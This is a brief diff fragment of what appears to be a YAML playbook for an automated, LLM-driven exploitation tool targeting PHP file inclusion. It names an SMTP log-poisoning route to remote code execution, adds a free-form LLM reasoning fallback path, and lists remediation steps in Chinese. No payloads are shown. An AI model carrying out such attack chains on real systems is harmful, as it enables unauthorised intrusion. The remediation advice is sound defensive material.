+          shell_type: "rce_smtp_log_poison"
+
+  # ═══════════════════════════════════════════════════════════════════
+  # Path 4: LLM 自由推理兜底
+  # ═══════════════════════════════════════════════════════════════════
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+
+remediation: |
+  1. 禁止用户输入直接用于 include/require, 使用白名单限制可包含文件
+  2. 设置 open_basedir 限制文件访问范围
+  3. 关闭 allow_url_include 和 allow_url_fopen
+  4. 限制日志文件权限, 避免 Web 进程可读系统日志
+  5. 修改 SSH 配置限制登录用户名字符集
+  6. 配置 Web 服务器日志格式, 转义或截断特殊字符
